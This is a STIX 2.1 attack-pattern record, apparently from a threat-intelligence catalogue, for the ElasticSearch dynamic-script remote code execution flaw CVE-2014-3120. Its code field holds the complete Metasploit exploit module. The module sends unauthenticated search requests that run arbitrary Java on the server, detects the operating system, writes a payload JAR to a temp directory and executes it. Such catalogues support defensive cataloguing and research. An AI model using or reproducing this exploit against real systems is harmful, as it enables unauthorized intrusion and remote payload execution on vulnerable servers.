{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--de2b3ec6-43af-4805-8f0b-970d33f32224",
    "created": "2024-08-14T17:05:16.927224Z",
    "modified": "2024-08-14T17:05:16.927228Z",
    "name": "ElasticSearch Dynamic Script Arbitrary Java Execution",
    "description": " This module exploits a remote command execution (RCE) vulnerability in ElasticSearch exploitable by default on ElasticSearch prior to 1.2.0. The bug is found in the REST API, which does not require authentication, where the search function allows dynamic scripts execution. It can be used for remote attackers to execute arbitrary Java code. This module has been tested successfully on ElasticSearch 1.1.1 on Ubuntu Server 12.04 and Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/elasticsearch/script_mvel_rce.rb",
            "external_id": "script_mvel_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3120"
        },
        {
            "source_name": "reference",
            "url": "http://bouk.co/blog/elasticsearch-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ElasticSearch Dynamic Script Arbitrary Java Execution',\n      'Description'    => %q{\n        This module exploits a remote command execution (RCE) vulnerability in ElasticSearch,\n        exploitable by default on ElasticSearch prior to 1.2.0. The bug is found in the\n        REST API, which does not require authentication, where the search\n        function allows dynamic scripts execution. It can be used for remote attackers\n        to execute arbitrary Java code. This module has been tested successfully on\n        ElasticSearch 1.1.1 on Ubuntu Server 12.04 and Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'Alex Brasetvik',     # Vulnerability discovery\n          'Bouke van der Bijl', # Vulnerability discovery and PoC\n          'juan vazquez'        # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-3120'],\n          ['OSVDB', '106949'],\n          ['EDB', '33370'],\n          ['URL', 'http://bouk.co/blog/elasticsearch-rce/'],\n          ['URL', 'https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch']\n        ],\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          [ 'ElasticSearch 1.1.1 / Automatic', { } ]\n        ],\n      'DisclosureDate' => '2013-12-09',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(9200),\n          OptString.new('TARGETURI', [ true, 'The path to the ElasticSearch REST API', \"/\"]),\n          OptString.new(\"WritableDir\", [ true, \"A directory where we can write files (only for *nix environments)\", \"/tmp\" ])\n        ])\n  end\n\n  def check\n    result = Exploit::CheckCode::Safe\n\n    if vulnerable?\n      result = Exploit::CheckCode::Vulnerable\n    end\n\n    result\n  end\n\n  def exploit\n    print_status(\"Trying to execute arbitrary Java...\")\n    unless vulnerable?\n      fail_with(Failure::Unknown, \"#{peer} - Java has not been executed, aborting...\")\n    end\n\n    print_status(\"Discovering remote OS...\")\n    res = execute(java_os)\n    result = parse_result(res)\n    if result.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Could not identify remote OS...\")\n    else\n      # TODO: It'd be nice to report_host() with this info.\n      print_good(\"Remote OS is '#{result}'\")\n    end\n\n    jar_file = \"\"\n    if result =~ /win/i\n      print_status(\"Discovering TEMP path\")\n      res = execute(java_tmp_dir)\n      result = parse_result(res)\n      if result.nil?\n        fail_with(Failure::Unknown, \"#{peer} - Could not identify TEMP path...\")\n      else\n        print_good(\"TEMP path identified: '#{result}'\")\n      end\n      jar_file = \"#{result}#{rand_text_alpha(3 + rand(4))}.jar\"\n    else\n      jar_file = File.join(datastore['WritableDir'], \"#{rand_text_alpha(3 + rand(4))}.jar\")\n    end\n\n    register_file_for_cleanup(jar_file)\n    execute(java_payload(jar_file))\n  end\n\n  def vulnerable?\n    java = 'System.getProperty(\"java.class.path\")'\n\n    vprint_status(\"Trying to execute 'System.getProperty(\\\"java.version\\\")'...\")\n    res = execute(java)\n    result = parse_result(res)\n\n    if result.nil?\n      vprint_status(\"No results for the Java test\")\n      return false\n    elsif result =~ /elasticsearch/\n      vprint_status(\"Answer to Java test: #{result}\")\n      return true\n    else\n      vprint_status(\"Answer to Java test: #{result}\")\n      return false\n    end\n  end\n\n  def parse_result(res)\n    unless res\n      vprint_error(\"#{peer} no response\")\n      return nil\n    end\n\n    unless res.code == 200 && res.body\n      vprint_error(\"#{peer} responded with HTTP code #{res.code} (with#{res.body ? '' : 'out'} a body)\")\n      return nil\n    end\n\n    begin\n      json = JSON.parse(res.body.to_s)\n    rescue JSON::ParserError\n      return nil\n    end\n\n    begin\n      result = json['hits']['hits'][0]['fields']['msf_result']\n    rescue\n      return nil\n    end\n\n    result.is_a?(::Array) ? result.first : result\n  end\n\n  def to_java_byte_array(str)\n    buff = \"byte[] buf = new byte[#{str.length}];\\n\"\n    i = 0\n    str.unpack('C*').each do |c|\n      buff << \"buf[#{i}] = #{c};\\n\"\n      i = i + 1\n    end\n\n    buff\n  end\n\n  def java_os\n    \"System.getProperty(\\\"os.name\\\")\"\n  end\n\n  def java_tmp_dir\n    \"System.getProperty(\\\"java.io.tmpdir\\\");\"\n  end\n\n\n  def java_payload(file_name)\n    source = <<-EOF\nimport java.io.*;\nimport java.lang.*;\nimport java.net.*;\n\n#{to_java_byte_array(payload.encoded_jar.pack)}\nFile f = new File('#{file_name.gsub(/\\\\/, \"/\")}');\nFileOutputStream fs = new FileOutputStream(f);\nbs = new BufferedOutputStream(fs);\nbs.write(buf);\nbs.close();\nbs = null;\nURL u = f.toURI().toURL();\nURLClassLoader cl = new URLClassLoader(new java.net.URL[]{u});\nClass c = cl.loadClass('metasploit.Payload');\nc.main(null);\n    EOF\n\n    source\n  end\n\n  def execute(java)\n    payload = {\n      \"size\" => 1,\n      \"query\" => {\n        \"filtered\" => {\n          \"query\" => {\n            \"match_all\" => {}\n          }\n        }\n      },\n      \"script_fields\" => {\n        \"msf_result\" => {\n          \"script\" => java\n        }\n      }\n    }\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path.to_s, \"_search\"),\n      'method' => 'POST',\n      'data'   => JSON.generate(payload)\n    })\n\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-09",
    "x_mitre_platforms": [
        "java'"
    ]
}